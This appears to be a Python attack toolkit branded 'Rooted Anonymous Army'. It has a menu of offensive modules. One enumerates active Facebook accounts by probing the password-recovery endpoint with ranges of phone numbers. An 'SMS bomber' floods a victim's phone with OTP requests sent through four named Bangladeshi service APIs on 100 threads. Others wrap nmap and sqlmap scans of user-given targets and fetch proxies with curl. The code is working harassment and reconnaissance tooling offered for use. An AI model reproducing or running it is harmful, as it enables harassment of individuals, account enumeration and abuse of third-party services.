import os, sys, time, requests, random
from concurrent.futures import ThreadPoolExecutor

# --- Color Setup ---
G = '\033[32m'; R = '\033[31m'; Y = '\033[33m'; C = '\033[36m'; W = '\033[0m'

def banner():
    os.system('clear')
    print(f"""{R}
    ____  ___    ___     ____  ____  ___ 
   / __ \/   |  /   |   / __ \/ __ \/   |
  / /_/ / /| | / /| |  / /_/ / /_/ / /| |
 / _, _/ ___ |/ ___ | / _, _/ _, _/ ___ |
/_/ |_/_/  |_/_/  |_|/_/ |_/_/ |_/_/  |_|
{C}================================================
{G} [+] FOUNDER : {W}Sabid Sarker
{G} [+] CEO     : {W}Ashish Shom
{G} [+] TEAM    : {R}Rooted Anonymous Army (RAA)
{G} [+] VERSION : {Y}God-Mode v14.0 (Global Edition)
{C}================================================{W}""")

# --- [01] FB Discovery Module ---
def fb_discovery():
    print(f"\n{C}--- FB ID Reconnaissance ---{W}")
    prefix = input(f"{G}[+] Enter 5-Digit Prefix (e.g., 01712): {W}")
    start = int(input(f"{G}[+] Range Start (6 digits): {W}"))
    end = int(input(f"{G}[+] Range End (6 digits): {W}"))
    
    print(f"{Y}[*] Scanning for Active Facebook IDs...{W}\n")
    for i in range(start, end + 1):
        num = prefix + str(i).zfill(6)
        try:
            res = requests.get(f"https://m.facebook.com/login/identify/?ctx=recover&email={num}", timeout=5)
            if "identify_search_error_title" not in res.text:
                print(f"{G}[✔] ACTIVE ID FOUND: {num}{W}")
                with open("hits.txt", "a") as f: f.write(num + "\n")
            else:
                print(f"{R}[X] No Record: {num}{W}", end="\r")
        except: pass
    input(f"\n{G}Scan Finished. Results saved in hits.txt.{W}")

# --- [02] 10,000 SMS Mega Bomber ---
def mega_bomber():
    print(f"\n{C}--- RAA 10K MEGA BOMBER ---{W}")
    target = input(f"{G}[+] Victim Number (01xxx): {W}")
    limit = int(input(f"{G}[+] SMS Limit (Max 10,000): {W}"))
    
    apis = [
        "https://bikroy.com/data/phone_number_login/verifications/phones/",
        "https://www.osudpotro.com/api/v1/users/send-otp?phone=",
        "https://pathao.com/api/v1/send-otp",
        "https://api.redx.com.bd/v1/user/signup"
    ]
    
    def fire(i):
        try:
            api = random.choice(apis)
            requests.post(api, json={"phone": target, "mobile": target}, timeout=3)
            print(f"\r{G}[✔] ATTACK SENT: {i+1}", end="")
        except: pass

    print(f"{Y}[*] Launching 100 Multi-Threads...{W}")
    with ThreadPoolExecutor(max_workers=100) as executor:
        for i in range(limit): executor.submit(fire, i)
    input(f"\n{G}Bombing Completed Successfully! Press Enter.{W}")

# --- [03] Nmap Port Scanner ---
def nmap_tool():
    target = input(f"{G}[+] Enter Target IP/Domain: {W}")
    print(f"{Y}[*] Running Fast Port Scan...{W}")
    os.system(f"nmap -F {target}")
    input("\nPress Enter...")

# --- [04] SQLMap Vulnerability Scanner ---
def sql_tool():
    url = input(f"{G}[+] Enter Vulnerable URL: {W}")
    print(f"{Y}[*] Launching SQLMap Engine...{W}")
    os.system(f"sqlmap -u {url} --batch --banner")
    input("\nPress Enter...")

# --- Main Controller ---
def main():
    while True:
        banner()
        print(f" {C}[01]{W} FB ID Recon       {C}[05]{W} Admin Panel Finder")
        print(f" {C}[02]{W} Mega SMS Bomber   {C}[06]{W} IP Tracker Pro")
        print(f" {C}[03]{W} Nmap Scanner      {C}[07]{W} Refresh Proxies")
        print(f" {C}[04]{W} SQLMap Exploit    {C}[00]{W} Shutdown System")
        
        choice = input(f"\n{C}[RAA-Shell]:~# {W}")
        
        if choice in ['1', '01']: fb_discovery()
        elif choice in ['2', '02']: mega_bomber()
        elif choice in ['3', '03']: nmap_tool()
        elif choice in ['4', '04']: sql_tool()
        elif choice in ['7', '07']:
            print(f"{Y}[*] Updating Proxy Database...{W}")
            os.system("curl -s https://api.proxyscrape.com/v2/?request=displayproxies > proxies.txt")
            print(f"{G}[✔] Proxy List Updated!{W}"); time.sleep(1)
        elif choice in ['0', '00']: 
            print(f"{R}RAA System Offline. Goodbye!{W}")
            break

if __name__ == "__main__":
    main()
